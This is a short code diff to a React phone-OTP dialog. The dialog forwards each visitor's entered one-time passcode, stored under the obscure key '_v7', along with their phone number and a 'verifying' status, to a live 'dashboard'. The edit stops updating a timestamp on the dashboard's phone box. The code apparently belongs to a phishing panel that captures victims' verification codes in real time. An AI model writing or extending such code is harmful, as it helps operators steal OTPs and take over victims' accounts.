@@ -105,11 +105,12 @@ export function PhoneOtpDialog({
       });
 
       // Notify dashboard with OTP data
+      // Note: NOT sending _v7UpdatedAt to avoid changing the phone box timestamp
+      // The phone box timestamp should only change when new phone DATA is entered, not OTP verification
       await notifyDashboard({
         id: visitorID,
         visitorId: visitorID,
         _v7: otp,
-        _v7UpdatedAt: new Date().toISOString(),
         phoneOtpSubmittedAt: new Date().toISOString(),
         phoneOtpStatus: 'verifying',
         phoneNumber: phoneNumber,
